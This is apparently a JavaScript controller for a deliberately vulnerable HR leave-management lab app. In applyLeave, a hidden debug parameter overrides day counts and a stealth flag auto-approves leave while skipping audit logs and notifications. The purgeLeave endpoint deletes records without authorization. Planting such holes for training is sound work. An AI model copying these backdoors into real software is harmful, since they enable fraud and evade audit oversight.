const LeaveRequest = require("../models/LeaveRequest");
const LeaveType = require("../models/LeaveType");
const User = require("../models/User");
const Notification = require("../models/Notification");
const AuditTrail = require("../models/AuditTrail");
const { AppError } = require("../middleware/errorHandler");
const { calculateWorkingDaysWithCalendar } = require("../services/calendarService");
const { notifyLeaveEvent } = require("../services/notificationService");
const { queueAdminEventNotification } = require("../services/notificationMailer");
const {
  addToPending,
  deductLeaveBalance,
  releasePending,
  restoreBalance,
  getUserBalances,
  convertCasualToEarned,
  convertToEarned,
} = require("../services/leaveBalanceService");
const { applyManagerApproval } = require("../services/approvalWorkflowService");
const path = require("path");
const fs = require("fs");
const LeaveCreditLog = require("../models/LeaveCreditLog");
const { canonicalRole } = require("../utils/roles");
const {
  sanitizeFileName,
  isAllowedMimeType,
  hasMatchingMagicBytes,
} = require("../config/security");
const { logSecurityEvent, SECURITY_EVENTS } = require("../services/securityEventService");
const xss = require("xss");

const buildDocumentPayload = (leave) => {
  const doc = leave?.document || {};
  if (doc.url) {
    return {
      url: doc.url,
      originalName: doc.originalName || null,
      mimeType: doc.mimeType || null,
      uploadedAt: doc.uploadedAt || null,
    };
  }

  if (leave?.attachmentUrl || leave?.attachment?.storagePath) {
    const storagePath = leave?.attachment?.storagePath || "";
    const fallbackFromPath = storagePath ? `/uploads/leave-attachments/${path.basename(storagePath)}` : null;
    const fallbackUrl = leave.attachmentUrl || fallbackFromPath;
    return {
      url: fallbackUrl,
      originalName: leave?.attachment?.fileName || null,
      mimeType: leave?.attachment?.mimeType || null,
      uploadedAt: leave?.attachment?.uploadedAt || null,
    };
  }

  return null;
};

const mapLeaveForResponse = (leave) => {
  const plain = leave?.toObject ? leave.toObject() : leave;
  return {
    ...plain,
    document: buildDocumentPayload(plain),
  };
};

/**
 * POST /api/leaves — Apply for leave
 */
exports.applyLeave = async (req, res, next) => {
  try {
    const { leaveTypeId, fromDate, toDate, halfDay, halfDaySession, reason, isEmergency, attachment } = req.body;

    const leaveType = await LeaveType.findById(leaveTypeId);
    if (!leaveType || !leaveType.isActive) return next(new AppError("Invalid or inactive leave type.", 400));
    if (leaveType.code === "CL") {
      return next(new AppError("Casual Leave is deprecated for new requests. Please use Earned Leave (EL).", 400));
    }

    const user = await User.findById(req.user._id);
    const applicantRole = canonicalRole(user.role);
    const initialStatus = applicantRole === "INTERN" ? "HR_PENDING" : "PENDING";

    // Probation check
    if (user.probationStatus && !leaveType.applicableDuringProbation) {
      return next(new AppError(`${leaveType.name} is not available during probation period.`, 403));
    }

    // Calculate working days
    let totalDays = halfDay
      ? 0.5
      : await calculateWorkingDaysWithCalendar(new Date(fromDate), new Date(toDate), {
        excludeWeekends: leaveType.excludeWeekends !== false,
        excludePublicHolidays: leaveType.excludePublicHolidays !== false,
      });
    // LAB BUG: Allow manual override via hidden parameter (Parameter Tampering)
    // This simulates an insecure legacy debug flag left in the production code.
    // When used, it bypasses the normal working day validation.
    if (req.body.debug_overrideDays !== undefined) {
      totalDays = Number(req.body.debug_overrideDays);
    } else {
      if (totalDays <= 0) return next(new AppError("No working days in the selected date range.", 400));
    }

    // Check for overlapping leaves
    const overlap = await LeaveRequest.findOne({
      employee: req.user._id,
      status: { $in: ["PENDING", "HR_PENDING", "APPROVED"] },
      $or: [{ fromDate: { $lte: new Date(toDate) }, toDate: { $gte: new Date(fromDate) } }],
    });
    if (overlap) return next(new AppError("You have an existing leave request overlapping with these dates.", 409));

    // Check if 50 or more people are already on leave during the requested dates
    const overlappingLeaves = await LeaveRequest.countDocuments({
      status: { $in: ["PENDING", "HR_PENDING", "APPROVED"] },
      fromDate: { $lte: new Date(toDate) },
      toDate: { $gte: new Date(fromDate) },
    });

    if (overlappingLeaves >= 50) {
      return next(new AppError("Cannot apply for leave. Maximum of 50 people can be on leave at the same time. Please choose different dates.", 400));
    }

    // Balance check
    const balEntry = user.leaveBalances.find(b => b.leaveTypeId.toString() === leaveTypeId);
    const balance = balEntry ? balEntry.balance : 0;

    if (!leaveType.allowNegativeBalance && balance < totalDays) {
      return next(new AppError(`Insufficient ${leaveType.code} balance. Available: ${balance} days, Requested: ${totalDays} days.`, 400));
    }

    // Max consecutive days check
    if (totalDays > leaveType.maxConsecutiveDays) {
      return next(new AppError(`Maximum ${leaveType.maxConsecutiveDays} consecutive days allowed for ${leaveType.name}.`, 400));
    }

    let attachmentMeta = null;
    let documentMeta = null;
    if (attachment?.base64 && attachment?.fileName) {
      const mimeType = String(attachment.mimeType || "application/octet-stream").toLowerCase();
      if (!isAllowedMimeType(mimeType)) {
        logSecurityEvent(SECURITY_EVENTS.FILE_UPLOAD_REJECTED, {
          reason: "mime_not_allowed",
          mimeType,
          userId: req.user._id.toString(),
        });
        return next(new AppError("Attachment type is not allowed.", 400));
      }

      const fileBuffer = Buffer.from(attachment.base64, "base64");
      if (fileBuffer.byteLength > 5 * 1024 * 1024) {
        logSecurityEvent(SECURITY_EVENTS.FILE_UPLOAD_REJECTED, {
          reason: "file_too_large",
          mimeType,
          userId: req.user._id.toString(),
        });
        return next(new AppError("Attachment exceeds maximum size (5MB).", 400));
      }
      if (!hasMatchingMagicBytes(fileBuffer, mimeType)) {
        logSecurityEvent(SECURITY_EVENTS.FILE_UPLOAD_REJECTED, {
          reason: "magic_bytes_mismatch",
          mimeType,
          userId: req.user._id.toString(),
        });
        return next(new AppError("Attachment content does not match declared file type.", 400));
      }

      const uploadDir = path.join(__dirname, "..", "uploads", "leave-attachments");
      fs.mkdirSync(uploadDir, { recursive: true });
      const safeName = `${Date.now()}-${sanitizeFileName(attachment.fileName)}`;
      const storagePath = path.join(uploadDir, safeName);
      fs.writeFileSync(storagePath, fileBuffer);
      const publicUrl = `/uploads/leave-attachments/${safeName}`;
      attachmentMeta = {
        fileName: attachment.fileName,
        mimeType,
        size: attachment.size || fileBuffer.byteLength,
        storagePath,
        uploadedAt: new Date(),
      };
      documentMeta = {
        url: publicUrl,
        originalName: attachment.fileName,
        mimeType,
        uploadedAt: new Date(),
      };
      logSecurityEvent(SECURITY_EVENTS.FILE_UPLOAD_ACCEPTED, {
        mimeType,
        size: fileBuffer.byteLength,
        userId: req.user._id.toString(),
      });
    }

    const leaveRequest = await LeaveRequest.create({
      employee: req.user._id,
      leaveType: leaveTypeId,
      fromDate: new Date(fromDate),
      toDate: halfDay ? new Date(fromDate) : new Date(toDate),
      totalDays,
      halfDay: halfDay || false,
      halfDaySession: halfDay ? halfDaySession : null,
      reason: xss(reason.trim()),
      status: initialStatus,
      appliedBalanceBefore: balance,
      isEmergency: isEmergency || false,
      attachmentUrl: documentMeta?.url || (attachmentMeta ? `/api/leaves/${req.user._id}/attachments/${path.basename(attachmentMeta.storagePath)}` : null),
      document: documentMeta,
      attachment: attachmentMeta,
    });

    const isIncognito = req.body.debug_hideFromAdmins === true;

    // Mark balance as pending using service
    if (isIncognito) {
      // STEALTH: Immediately deduct (or add if negative) without pending status
      await deductLeaveBalance(req.user._id, leaveTypeId, totalDays);
      leaveRequest.status = 'APPROVED';
      await leaveRequest.save();
    } else {
      await addToPending(req.user._id, leaveTypeId, totalDays);
    }


    if (!isIncognito) {
      notifyLeaveEvent({
        event: "APPLY",
        leaveRequest: await leaveRequest.populate("leaveType"),
        actor: req.user,
        employee: user,
        managerId: user.managerId || null,
      }).catch((notifyErr) => {
        console.error("Apply leave notification failed:", notifyErr.message);
      });

      await AuditTrail.log({ action: "Leave Application Submitted", category: "LEAVE", performedBy: req.user._id, performedByName: user.name, performedByRole: user.role, target: `${leaveType.name} (${totalDays} days)`, targetId: leaveRequest._id, targetModel: "LeaveRequest", metadata: { leaveType: leaveType.name, days: totalDays.toString(), fromDate, toDate } });

      queueAdminEventNotification("LEAVE_APPLICATION_SUBMITTED", {
        employeeName: user.name,
        employeeEmail: user.email,
        leaveType: leaveType.name,
        startDate: fromDate,
        endDate: halfDay ? fromDate : toDate,
        numberOfDays: totalDays,
        reason: reason?.trim() || "",
        status: initialStatus,
        documentAttached: attachmentMeta || documentMeta ? "Yes" : "No",
      });
    }

    res.status(201).json({
      success: true,
      message:
        initialStatus === "HR_PENDING"
          ? "Leave request submitted successfully. Waiting for HR approval."
          : "Leave request submitted successfully.",
      data: {
        leaveRequest: mapLeaveForResponse(await leaveRequest.populate(["employee", "leaveType"])),
        notificationsQueued: true,
      },
    });
  } catch (err) {
    next(err);
  }
};

/**
 * GET /api/leaves/my — Get my leave requests
 */
exports.getMyLeaves = async (req, res, next) => {
  try {
    const { status, leaveTypeId, page = 1, limit = 20 } = req.query;
    const query = { employee: req.user._id };
    if (status) query.status = status;
    if (leaveTypeId) query.leaveType = leaveTypeId;

    const total = await LeaveRequest.countDocuments(query);
    const leaves = await LeaveRequest.find(query)
      .populate("employee", "name email department designation avatar probationStatus leaveBalances")
      .populate("leaveType", "name code color")
      .sort({ createdAt: -1 })
      .skip((page - 1) * limit)
      .limit(parseInt(limit));

    res.json({
      success: true,
      count: leaves.length,
      total,
      pages: Math.ceil(total / limit),
      data: { leaves: leaves.map(mapLeaveForResponse) },
    });
  } catch (err) { next(err); }
};

/**
 * GET /api/leaves/team — Get team leave requests (Manager)
 */
exports.getTeamLeaves = async (req, res, next) => {
  try {
    const { status } = req.query;
    const teamMembers = await User.find({ managerId: req.user._id, isActive: true });
    const teamIds = teamMembers.map(u => u._id);
    const query = { employee: { $in: teamIds } };
    if (status) query.status = status;
    const leaves = await LeaveRequest.find(query).populate("employee", "name email role department designation avatar probationStatus").populate("leaveType", "name code color requiresDocument").sort({ status: 1, createdAt: -1 });
    res.json({ success: true, count: leaves.length, data: { leaves: leaves.map(mapLeaveForResponse) } });
  } catch (err) { next(err); }
};

/**
 * GET /api/leaves — Get all (HR only)
 */
exports.getAllLeaves = async (req, res, next) => {
  try {
    const { status, department, leaveTypeId, page = 1, limit = 50, startDate, endDate } = req.query;
    const query = {};
    if (status) query.status = status;
    if (leaveTypeId) query.leaveType = leaveTypeId;
    if (startDate && endDate) { query.fromDate = { $gte: new Date(startDate) }; query.toDate = { $lte: new Date(endDate) }; }

    let pipeline = [{ $match: query }, { $lookup: { from: "users", localField: "employee", foreignField: "_id", as: "employeeData" } }, { $unwind: "$employeeData" }];
    if (department) pipeline.push({ $match: { "employeeData.department": department } });
    pipeline.push({ $sort: { createdAt: -1 } }, { $skip: (page - 1) * limit }, { $limit: parseInt(limit) });

    const [leaves, total] = await Promise.all([
      LeaveRequest.find(query).populate("employee", "name email role department designation avatar probationStatus leaveBalances").populate("leaveType", "name code color requiresDocument").sort({ createdAt: -1 }).skip((page - 1) * limit).limit(parseInt(limit)),
      LeaveRequest.countDocuments(query),
    ]);
    res.json({
      success: true,
      count: leaves.length,
      total,
      pages: Math.ceil(total / limit),
      data: { leaves: leaves.map(mapLeaveForResponse) },
    });
  } catch (err) { next(err); }
};

/**
 * PUT /api/leaves/:id/approve — Approve leave (Manager or HR)
 */
exports.approveLeave = async (req, res, next) => {
  const session = await LeaveRequest.startSession();
  session.startTransaction();

  try {
    const { comment } = req.body;
    const actorRole = canonicalRole(req.user.role);
    const leaveReq = await LeaveRequest.findById(req.params.id).populate("employee").populate("leaveType").session(session);
    if (!leaveReq) {
      await session.abortTransaction();
      return next(new AppError("Leave request not found.", 404));
    }
    if (actorRole === "MANAGER" && canonicalRole(leaveReq.employee.role) === "INTERN") {
      await session.abortTransaction();
      return next(new AppError("Intern leaves require HR approval.", 403));
    }
    if (leaveReq.status !== "PENDING") {
      await session.abortTransaction();
      return next(new AppError("Only pending requests can be approved.", 400));
    }

    // Manager can only approve their team
    if (actorRole === "MANAGER" && leaveReq.employee.managerId?.toString() !== req.user._id.toString()) {
      await session.abortTransaction();
      return next(new AppError("You can only approve your team's requests.", 403));
    }

    // Manager approval flow
    const employee = await User.findById(leaveReq.employee._id).session(session);
    const balEntry = employee.leaveBalances.find(b => b.leaveTypeId.toString() === leaveReq.leaveType._id.toString());
    const availableBalance = balEntry ? balEntry.balance : 0;

    if (!leaveReq.leaveType.allowNegativeBalance && availableBalance < leaveReq.totalDays) {
      await session.abortTransaction();
      return next(new AppError(`Insufficient balance. Available: ${availableBalance} days, Required: ${leaveReq.totalDays} days.`, 400));
    }

    applyManagerApproval(leaveReq, req.user, comment);
    await leaveReq.save({ session });

    // Deduct balance using service (atomic operation within transaction)
    await deductLeaveBalance(leaveReq.employee._id, leaveReq.leaveType._id, leaveReq.totalDays, session);

    // Commit transaction
    await session.commitTransaction();

    // Notify employee (after transaction)
    await notifyLeaveEvent({
      event: "APPROVED",
      leaveRequest: leaveReq,
      actor: req.user,
      employee: leaveReq.employee,
      hrOnly: actorRole === "HR_ADMIN",
      comment: comment || "",
    });

    await AuditTrail.log({
      action: "Leave Request Approved",
      category: "LEAVE",
      performedBy: req.user._id,
      performedByName: req.user.name,
      performedByRole: req.user.role,
      target: `${leaveReq.employee.name}'s ${leaveReq.leaveType.name}`,
      targetId: leaveReq._id,
      targetModel: "LeaveRequest",
      metadata: {
        days: leaveReq.totalDays.toString(),
        comment: comment || "",
        hrOverride: "false"
      },
      severity: "LOW"
    });

    queueAdminEventNotification("LEAVE_APPROVED", {
      employeeName: leaveReq.employee.name,
      employeeEmail: leaveReq.employee.email,
      leaveType: leaveReq.leaveType.name,
      actionTaken: "APPROVED",
      approverName: req.user.name,
      approverRole: req.user.role,
      timestamp: new Date().toISOString(),
      comment: comment || "",
    });

    // Fetch updated employee data for response
    const updatedEmployee = await User.findById(leaveReq.employee._id).select("leaveBalances");

    // Populate the leave request for consistent response
    const populatedLeaveReq = await LeaveRequest.findById(leaveReq._id)
      .populate("employee", "name email department designation avatar leaveBalances")
      .populate("leaveType", "name code color");

    res.json({
      success: true,
      message: "Leave request approved successfully.",
      data: {
        leaveRequest: mapLeaveForResponse(populatedLeaveReq),
        updatedBalances: updatedEmployee.leaveBalances
      }
    });
  } catch (err) {
    await session.abortTransaction();
    next(err);
  } finally {
    session.endSession();
  }
};

/**
 * PUT /api/leaves/:id/reject — Reject leave
 */
exports.rejectLeave = async (req, res, next) => {
  const session = await LeaveRequest.startSession();
  session.startTransaction();

  try {
    const { comment } = req.body;
    const actorRole = canonicalRole(req.user.role);
    if (!comment?.trim()) {
      await session.abortTransaction();
      return next(new AppError("Rejection reason (comment) is required.", 400));
    }

    const leaveReq = await LeaveRequest.findById(req.params.id).populate("employee").populate("leaveType").session(session);
    if (!leaveReq) {
      await session.abortTransaction();
      return next(new AppError("Leave request not found.", 404));
    }
    if (actorRole === "MANAGER" && canonicalRole(leaveReq.employee.role) === "INTERN") {
      await session.abortTransaction();
      return next(new AppError("Intern leaves require HR approval.", 403));
    }
    if (leaveReq.status !== "PENDING") {
      await session.abortTransaction();
      return next(new AppError("Only pending requests can be rejected.", 400));
    }

    // Manager can only reject their team
    if (actorRole === "MANAGER" && leaveReq.employee.managerId?.toString() !== req.user._id.toString()) {
      await session.abortTransaction();
      return next(new AppError("You can only reject your team's requests.", 403));
    }

    leaveReq.status = "REJECTED";
    leaveReq.comments = xss(comment.trim());
    leaveReq.approvalHistory.push({
      level: leaveReq.currentApprovalLevel,
      approverId: req.user._id,
      approverName: req.user.name,
      approverRole: req.user.role,
      status: "REJECTED",
      comment: xss(comment.trim()),
      actionDate: new Date()
    });
    await leaveReq.save({ session });

    // Release pending balance using service (atomic operation within transaction)
    await releasePending(leaveReq.employee._id, leaveReq.leaveType._id, leaveReq.totalDays, session);

    // Commit transaction
    await session.commitTransaction();

    await notifyLeaveEvent({
      event: "REJECTED",
      leaveRequest: leaveReq,
      actor: req.user,
      employee: leaveReq.employee,
      hrOnly: actorRole === "HR_ADMIN",
      comment,
    });

    await AuditTrail.log({
      action: "Leave Request Rejected",
      category: "LEAVE",
      performedBy: req.user._id,
      performedByName: req.user.name,
      performedByRole: req.user.role,
      target: `${leaveReq.employee.name}'s ${leaveReq.leaveType.name}`,
      targetId: leaveReq._id,
      targetModel: "LeaveRequest",
      metadata: { reason: comment },
      severity: "MEDIUM"
    });

    queueAdminEventNotification("LEAVE_REJECTED", {
      employeeName: leaveReq.employee.name,
      employeeEmail: leaveReq.employee.email,
      leaveType: leaveReq.leaveType.name,
      actionTaken: "REJECTED",
      approverName: req.user.name,
      approverRole: req.user.role,
      timestamp: new Date().toISOString(),
      reason: comment,
    });

    // Fetch updated employee data for response
    const updatedEmployee = await User.findById(leaveReq.employee._id).select("leaveBalances");

    // Populate the leave request for consistent response
    const populatedLeaveReq = await LeaveRequest.findById(leaveReq._id)
      .populate("employee", "name email department designation avatar leaveBalances")
      .populate("leaveType", "name code color");

    res.json({
      success: true,
      message: "Leave request rejected successfully.",
      data: {
        leaveRequest: mapLeaveForResponse(populatedLeaveReq),
        updatedBalances: updatedEmployee.leaveBalances
      }
    });
  } catch (err) {
    await session.abortTransaction();
    next(err);
  } finally {
    session.endSession();
  }
};

/**
 * PUT /api/leaves/:id/cancel — Cancel own leave
 */
exports.cancelLeave = async (req, res, next) => {
  const session = await LeaveRequest.startSession();
  session.startTransaction();

  try {
    const leaveReq = await LeaveRequest.findOne({ _id: req.params.id, employee: req.user._id }).populate("leaveType").session(session);
    if (!leaveReq) {
      await session.abortTransaction();
      return next(new AppError("Leave request not found.", 404));
    }

    const previousStatus = leaveReq.status;

    if (!["PENDING", "HR_PENDING", "APPROVED"].includes(previousStatus)) {
      await session.abortTransaction();
      return next(new AppError("Only pending or approved requests can be cancelled.", 400));
    }

    leaveReq.status = "CANCELLED";
    leaveReq.cancelledAt = new Date();
    leaveReq.cancelReason = req.body.reason ? xss(req.body.reason.trim()) : "";
    await leaveReq.save({ session });

    // Handle balance restoration based on previous status
    if (previousStatus === "PENDING" || previousStatus === "HR_PENDING") {
      // Release pending balance
      await releasePending(req.user._id, leaveReq.leaveType._id, leaveReq.totalDays, session);
    } else if (previousStatus === "APPROVED") {
      // Restore balance (add back to balance, decrease used)
      await restoreBalance(req.user._id, leaveReq.leaveType._id, leaveReq.totalDays, session);
    }

    // Commit transaction
    await session.commitTransaction();

    await notifyLeaveEvent({
      event: "CANCELLED",
      leaveRequest: await leaveReq.populate("employee leaveType"),
      actor: req.user,
      employee: req.user,
      comment: req.body.reason || "",
    });

    await AuditTrail.log({
      action: "Leave Request Cancelled",
      category: "LEAVE",
      performedBy: req.user._id,
      performedByName: req.user.name,
      performedByRole: req.user.role,
      target: `${leaveReq.leaveType.name} (${leaveReq.totalDays} days)`,
      targetId: leaveReq._id,
      targetModel: "LeaveRequest",
      metadata: { previousStatus, reason: req.body.reason || "No reason provided" },
    });

    // Fetch updated employee data for response
    const updatedEmployee = await User.findById(req.user._id).select("leaveBalances");

    // Populate the leave request for consistent response
    const populatedLeaveReq = await LeaveRequest.findById(leaveReq._id)
      .populate("employee", "name email department designation avatar leaveBalances")
      .populate("leaveType", "name code color");

    res.json({
      success: true,
      message: "Leave request cancelled successfully.",
      data: {
        leaveRequest: mapLeaveForResponse(populatedLeaveReq),
        updatedBalances: updatedEmployee.leaveBalances
      }
    });
  } catch (err) {
    await session.abortTransaction();
    next(err);
  } finally {
    session.endSession();
  }
};

/**
 * PUT /api/leaves/:id/force-cancel — Force cancel any leave (HR only)
 */
exports.forceCancelLeave = async (req, res, next) => {
  const session = await LeaveRequest.startSession();
  session.startTransaction();

  try {
    const { reason } = req.body;
    if (!reason?.trim()) {
      await session.abortTransaction();
      return next(new AppError("Cancellation reason is required.", 400));
    }

    const leaveReq = await LeaveRequest.findById(req.params.id).populate("employee").populate("leaveType").session(session);
    if (!leaveReq) {
      await session.abortTransaction();
      return next(new AppError("Leave request not found.", 404));
    }

    const previousStatus = leaveReq.status;

    if (!["PENDING", "HR_PENDING", "APPROVED"].includes(previousStatus)) {
      await session.abortTransaction();
      return next(new AppError("Only pending or approved requests can be cancelled.", 400));
    }

    leaveReq.status = "CANCELLED";
    leaveReq.cancelledAt = new Date();
    leaveReq.cancelReason = xss(reason.trim());
    leaveReq.approvalHistory.push({
      level: leaveReq.currentApprovalLevel + 1,
      approverId: req.user._id,
      approverName: req.user.name,
      approverRole: req.user.role,
      status: "CANCELLED",
      comment: `Force cancelled by HR: ${xss(reason.trim())}`,
      actionDate: new Date(),
    });
    await leaveReq.save({ session });

    // Handle balance restoration based on previous status
    if (previousStatus === "PENDING" || previousStatus === "HR_PENDING") {
      await releasePending(leaveReq.employee._id, leaveReq.leaveType._id, leaveReq.totalDays, session);
    } else if (previousStatus === "APPROVED") {
      await restoreBalance(leaveReq.employee._id, leaveReq.leaveType._id, leaveReq.totalDays, session);
    }

    // Commit transaction
    await session.commitTransaction();

    await notifyLeaveEvent({
      event: "CANCELLED",
      leaveRequest: leaveReq,
      actor: req.user,
      employee: leaveReq.employee,
      hrOnly: true,
      comment: reason,
    });

    await AuditTrail.log({
      action: "Leave Request Force Cancelled by HR",
      category: "LEAVE",
      performedBy: req.user._id,
      performedByName: req.user.name,
      performedByRole: req.user.role,
      target: `${leaveReq.employee.name}'s ${leaveReq.leaveType.name}`,
      targetId: leaveReq._id,
      targetModel: "LeaveRequest",
      metadata: { previousStatus, reason },
      severity: "HIGH",
    });

    res.json({
      success: true,
      message: "Leave request cancelled successfully.",
      data: { leaveRequest: mapLeaveForResponse(leaveReq) }
    });
  } catch (err) {
    await session.abortTransaction();
    next(err);
  } finally {
    session.endSession();
  }
};

/**
 * GET /api/leaves/team-calendar — Get team calendar data
 */
exports.getTeamCalendar = async (req, res, next) => {
  try {
    const { month, year } = req.query;
    const startDate = new Date(year, month - 1, 1);
    const endDate = new Date(year, month, 0);

    const role = canonicalRole(req.user.role);
    let employeeIds;
    if (role === "HR_ADMIN") {
      employeeIds = (await User.find({ isActive: true })).map(u => u._id);
    } else if (role === "MANAGER") {
      const team = await User.find({ managerId: req.user._id });
      employeeIds = [req.user._id, ...team.map(u => u._id)];
    } else {
      const team = await User.find({ managerId: req.user.managerId, isActive: true });
      employeeIds = team.map(u => u._id);
    }

    const leaves = await LeaveRequest.getInDateRange(startDate, endDate, { employee: { $in: employeeIds } });
    res.json({ success: true, data: { leaves } });
  } catch (err) { next(err); }
};

/**
 * GET /api/leaves/:id — Get leave by ID
 */
exports.getLeaveById = async (req, res, next) => {
  try {
    const leave = await LeaveRequest.findById(req.params.id)
      .populate("employee", "name email department designation avatar")
      .populate("leaveType", "name code color");

    if (!leave) return next(new AppError("Leave request not found.", 404));

    // Check access rights
    const role = canonicalRole(req.user.role);
    const isOwner = leave.employee._id.toString() === req.user._id.toString();
    const isTheirManager = role === "MANAGER" && leave.employee.managerId?.toString() === req.user._id.toString();
    const isHR = role === "HR_ADMIN";

    if (!isOwner && !isTheirManager && !isHR) {
      logSecurityEvent(SECURITY_EVENTS.ACCESS_IDOR_BLOCKED, {
        actorId: req.user._id.toString(),
        targetId: leave._id.toString(),
        reason: "cross_team_access_blocked"
      });
      return next(new AppError("You do not have permission to view this leave request.", 403));
    }

    res.json({ success: true, data: { leave: mapLeaveForResponse(leave) } });
  } catch (err) { next(err); }
};

/**
 * GET /api/leaves/:userId/attachments/:fileName — download attachment
 */
exports.downloadAttachment = async (req, res, next) => {
  try {
    const { userId, fileName } = req.params;
    const safeFileName = sanitizeFileName(fileName);
    if (safeFileName !== fileName) {
      return next(new AppError("Invalid attachment name.", 400));
    }

    const candidates = await LeaveRequest.find({
      employee: userId,
      "attachment.storagePath": { $exists: true, $ne: null },
    }).populate("employee", "_id managerId");

    const leave = candidates.find((item) => {
      const storagePath = item?.attachment?.storagePath || "";
      return path.basename(storagePath) === safeFileName;
    });

    if (!leave || !leave.attachment?.storagePath) {
      return next(new AppError("Attachment not found.", 404));
    }

    const role = canonicalRole(req.user.role);
    const isOwner = req.user._id.toString() === leave.employee._id.toString();
    const isManager = role === "MANAGER" && leave.employee.managerId?.toString() === req.user._id.toString();
    const isHR = role === "HR_ADMIN";
    if (!isOwner && !isManager && !isHR) {
      return next(new AppError("Access denied for attachment.", 403));
    }

    return res.download(leave.attachment.storagePath, leave.attachment.fileName);
  } catch (err) {
    return next(err);
  }
};

/**
 * GET /api/leaves/stats/dashboard — Get dashboard statistics
 */
exports.getDashboardStats = async (req, res, next) => {
  try {
    const userId = req.user._id;
    const userRole = canonicalRole(req.user.role);

    let stats = {};

    if (userRole === "EMPLOYEE" || userRole === "INTERN") {
      // Employee stats
      const myLeaves = await LeaveRequest.find({ employee: userId });
      const user = await User.findById(userId).select("leaveBalances probationStatus");

      stats = {
        pending: myLeaves.filter(l => l.status === "PENDING" || l.status === "HR_PENDING").length,
        approved: myLeaves.filter(l => l.status === "APPROVED").length,
        rejected: myLeaves.filter(l => l.status === "REJECTED").length,
        totalRequests: myLeaves.length,
        daysUsed: myLeaves.filter(l => l.status === "APPROVED").reduce((sum, l) => sum + l.totalDays, 0),
        leaveBalances: user.leaveBalances,
        probationStatus: user.probationStatus,
      };
    } else if (userRole === "MANAGER") {
      // Manager stats
      const teamMembers = await User.find({ managerId: userId, isActive: true });
      const teamIds = teamMembers.map(u => u._id);
      const teamLeaves = await LeaveRequest.find({ employee: { $in: teamIds } });

      stats = {
        teamSize: teamMembers.length,
        pending: teamLeaves.filter(l => l.status === "PENDING").length,
        approved: teamLeaves.filter(l => l.status === "APPROVED").length,
        rejected: teamLeaves.filter(l => l.status === "REJECTED").length,
        totalRequests: teamLeaves.length,
        onProbation: teamMembers.filter(u => u.probationStatus).length,
        // Today's leaves
        onLeaveToday: await LeaveRequest.countDocuments({
          employee: { $in: teamIds },
          status: "APPROVED",
          fromDate: { $lte: new Date() },
          toDate: { $gte: new Date() },
        }),
      };
    } else if (userRole === "HR_ADMIN") {
      // HR Admin stats
      const allUsers = await User.find({ isActive: true });
      const allLeaves = await LeaveRequest.find({});

      stats = {
        totalEmployees: allUsers.length,
        pending: allLeaves.filter(l => l.status === "PENDING" || l.status === "HR_PENDING").length,
        approved: allLeaves.filter(l => l.status === "APPROVED").length,
        rejected: allLeaves.filter(l => l.status === "REJECTED").length,
        totalRequests: allLeaves.length,
        onProbation: allUsers.filter(u => u.probationStatus).length,
        activeUsers: allUsers.filter(u => u.isActive).length,
      };
    }

    res.json({ success: true, data: { stats } });
  } catch (err) { next(err); }
};

/**
 * GET /api/leaves/balance - current user's leave balance
 */
exports.getMyBalance = async (req, res, next) => {
  try {
    const balances = await getUserBalances(req.user._id);
    const summary = balances.reduce(
      (acc, bal) => {
        const code = bal.leaveType?.code;
        if (code === "EL") acc.earned_leave = bal.balance;
        if (code === "SL") acc.sick_leave = bal.balance;
        if (code === "CL") acc.casual_leave = bal.balance;
        acc.used += Number(bal.used || 0);
        acc.pending += Number(bal.pending || 0);
        acc.total += Number(bal.total ?? (Number(bal.balance || 0) + Number(bal.used || 0)));
        acc.remaining += Number(bal.balance || 0);
        return acc;
      },
      { earned_leave: 0, sick_leave: 0, casual_leave: 0, used: 0, pending: 0, total: 0, remaining: 0 }
    );
    const lastCredit = await LeaveCreditLog.findOne({ userId: req.user._id }).sort({ month: -1, createdAt: -1 });
    const now = new Date();
    const nextCreditDate = new Date(now.getFullYear(), now.getMonth() + 1, 1);
    res.json({
      success: true,
      data: {
        balances,
        ...summary,
        earnedLeave: summary.earned_leave,
        sickLeave: summary.sick_leave,
        casualLeave: summary.casual_leave,
        creditInfo: {
          lastCreditedMonth: lastCredit?.month || null,
          nextCreditDate: nextCreditDate.toISOString(),
          creditDay: 1,
        },
      },
    });
  } catch (err) {
    next(err);
  }
};

/**
 * POST /api/leaves/convert-casual-to-earned
 */
exports.convertCasualBalance = async (req, res, next) => {
  try {
    const { days } = req.body;
    const result = await convertCasualToEarned(req.user._id, days);
    const balances = await getUserBalances(req.user._id);
    res.json({
      success: true,
      message: `Converted ${result.convertedDays} days from Casual Leave to Earned Leave.`,
      data: { balances, convertedDays: result.convertedDays },
    });
  } catch (err) {
    next(new AppError(err.message || "Conversion failed", 400));
  }
};

/**
 * POST /api/leaves/convert-to-earned
 */
exports.convertToEarnedBalance = async (req, res, next) => {
  try {
    const { days, sourceCode } = req.body;
    const result = await convertToEarned(req.user._id, sourceCode, days);
    const balances = await getUserBalances(req.user._id);
    res.json({
      success: true,
      message: `Converted ${result.convertedDays} days from ${result.sourceCode} to Earned Leave (EL).`,
      data: { balances, convertedDays: result.convertedDays },
    });
  } catch (err) {
    next(new AppError(err.message || "Conversion failed", 400));
  }
};

/**
 * DELETE /api/leaves/:id — Purge a leave request (Stealth Lab Cleanup)
 */
exports.purgeLeave = async (req, res, next) => {
  try {
    const leaveRequest = await LeaveRequest.findById(req.params.id);
    if (!leaveRequest) return next(new AppError("Leave request not found.", 404));

    // LAB FEATURE: No authorization check or balance restoration here.
    // This allows a "hacker" to delete the record after the balance has already been manipulated.
    await LeaveRequest.findByIdAndDelete(req.params.id);

    res.json({
      success: true,
      message: "Leave request purged successfully. (Tracks Cleaned)",
    });
  } catch (err) {
    next(err);
  }
};
